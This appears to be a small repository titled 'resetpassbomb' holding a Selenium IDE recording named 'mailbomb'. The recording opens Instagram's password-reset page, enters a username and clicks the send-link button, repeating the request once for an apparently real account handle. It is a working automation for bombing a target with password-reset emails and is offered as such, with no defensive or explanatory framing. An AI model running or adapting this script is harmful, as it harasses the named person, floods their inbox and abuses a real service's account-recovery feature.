# resetpassbomb
instagram reset pass bomb

{
  "id": "c2a6db1d-4d75-4c36-9f5a-f413d765992b",
  "version": "2.0",
  "name": "mailbomb",
  "url": "https://www.instagram.com",
  "tests": [{
    "id": "4cc8c5d0-252b-4562-8f63-584132ed5212",
    "name": "1",
    "commands": [{
      "id": "6706cf93-205e-4a13-8016-4240a7e7d94f",
      "comment": "",
      "command": "open",
      "target": "/accounts/password/reset/",
      "targets": [],
      "value": ""
    }, {
      "id": "55a5bfd9-236b-4eaf-9a6d-8b4f3c66aae8",
      "comment": "",
      "command": "setWindowSize",
      "target": "550x690",
      "targets": [],
      "value": ""
    }, {
      "id": "bfd05266-35f6-41c9-a561-3dd99c7e2270",
      "comment": "",
      "command": "type",
      "target": "name=cppEmailOrUsername",
      "targets": [
        ["id=fcadc4b7ab9486", "id"],
        ["name=cppEmailOrUsername", "name"],
        ["css=#fcadc4b7ab9486", "css:finder"],
        ["xpath=//input[@id='fcadc4b7ab9486']", "xpath:attributes"],
        ["xpath=//span[@id='react-root']/section/main/div[2]/div/div/div[4]/form/label/input", "xpath:idRelative"],
        ["xpath=//input", "xpath:position"]
      ],
      "value": "username"
    }, {
      "id": "8ea1a175-a423-4190-b97a-704bab92c06b",
      "comment": "",
      "command": "click",
      "target": "css=.L3NKy",
      "targets": [
        ["css=.L3NKy", "css:finder"],
        ["xpath=//button[@type='button']", "xpath:attributes"],
        ["xpath=//span[@id='react-root']/section/main/div[2]/div/div/div[5]/button", "xpath:idRelative"],
        ["xpath=//button", "xpath:position"],
        ["xpath=//button[contains(.,'Giriş Bağlantısı Gönder')]", "xpath:innerText"]
      ],
      "value": ""
    }, {
      "id": "d14101c3-4fd8-42c8-ab01-9ceab9f86b90",
      "comment": "",
      "command": "mouseOver",
      "target": "css=.L3NKy",
      "targets": [
        ["css=.L3NKy", "css:finder"],
        ["xpath=//button[@type='button']", "xpath:attributes"],
        ["xpath=//span[@id='react-root']/section/main/div[2]/div/div/div[5]/button", "xpath:idRelative"],
        ["xpath=//button", "xpath:position"],
        ["xpath=//button[contains(.,'Giriş Bağlantısı Gönder')]", "xpath:innerText"]
      ],
      "value": ""
    }, {
      "id": "339bab19-f919-4316-8a2f-6bbc52f72d5b",
      "comment": "",
      "command": "mouseOut",
      "target": "css=.L3NKy",
      "targets": [
        ["css=.L3NKy", "css:finder"],
        ["xpath=//button[@type='button']", "xpath:attributes"],
        ["xpath=//span[@id='react-root']/section/main/div[2]/div/div/div[5]/button", "xpath:idRelative"],
        ["xpath=//button", "xpath:position"],
        ["xpath=//button[contains(.,'Giriş Bağlantısı Gönder')]", "xpath:innerText"]
      ],
      "value": ""
    }, {
      "id": "19a7c6cb-ffdb-43b5-a06f-af2cd6ff469e",
      "comment": "",
      "command": "click",
      "target": "id=f104cb6d8e8289c",
      "targets": [
        ["id=f104cb6d8e8289c", "id"],
        ["name=cppEmailOrUsername", "name"],
        ["css=#f104cb6d8e8289c", "css:finder"],
        ["xpath=//input[@id='f104cb6d8e8289c']", "xpath:attributes"],
        ["xpath=//span[@id='react-root']/section/main/div[2]/div/div/div[4]/form/label/input", "xpath:idRelative"],
        ["xpath=//input", "xpath:position"]
      ],
      "value": ""
    }, {
      "id": "8e25e4fd-f9bb-4e2c-941e-ddd5546977ce",
      "comment": "",
      "command": "type",
      "target": "id=f104cb6d8e8289c",
      "targets": [
        ["id=f104cb6d8e8289c", "id"],
        ["name=cppEmailOrUsername", "name"],
        ["css=#f104cb6d8e8289c", "css:finder"],
        ["xpath=//input[@id='f104cb6d8e8289c']", "xpath:attributes"],
        ["xpath=//span[@id='react-root']/section/main/div[2]/div/div/div[4]/form/label/input", "xpath:idRelative"],
        ["xpath=//input", "xpath:position"]
      ],
      "value": "husniyeoz0822"
    }, {
      "id": "ea265960-24f2-4bc8-abb9-fc7ceea0ae76",
      "comment": "",
      "command": "click",
      "target": "css=.L3NKy",
      "targets": [
        ["css=.L3NKy", "css:finder"],
        ["xpath=//button[@type='button']", "xpath:attributes"],
        ["xpath=//span[@id='react-root']/section/main/div[2]/div/div/div[5]/button", "xpath:idRelative"],
        ["xpath=//button", "xpath:position"],
        ["xpath=//button[contains(.,'Giriş Bağlantısı Gönder')]", "xpath:innerText"]
      ],
      "value": ""
    }]
  }],
  "suites": [{
    "id": "eca1181d-d763-476f-84b3-b4ba2bfa0a70",
    "name": "Default Suite",
    "persistSession": false,
    "parallel": false,
    "timeout": 300,
    "tests": []
  }],
  "urls": ["https://www.instagram.com/"],
  "plugins": []
}
